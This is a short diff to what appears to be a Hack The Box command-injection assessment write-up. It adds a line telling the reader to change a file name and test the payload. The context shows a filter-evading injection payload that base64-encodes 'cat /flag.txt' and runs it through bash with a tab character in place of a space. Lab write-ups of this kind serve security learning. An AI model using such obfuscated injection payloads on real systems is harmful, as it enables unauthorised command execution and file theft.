@@ -177,6 +177,6 @@ echo -n "cat ${PATH:0:1}flag.txt" | base64
 ```
 bash<<<$(base64%09-d<<<"Y2F0IC9mbGFnLnR4dA==")
 ```
-
+**Change the `from` file name and test the payload.**
 ![Reading flag.txt content](/images/htb/command-injection/command-injection-skills-assessment-flag-result.png)
 <hr/>
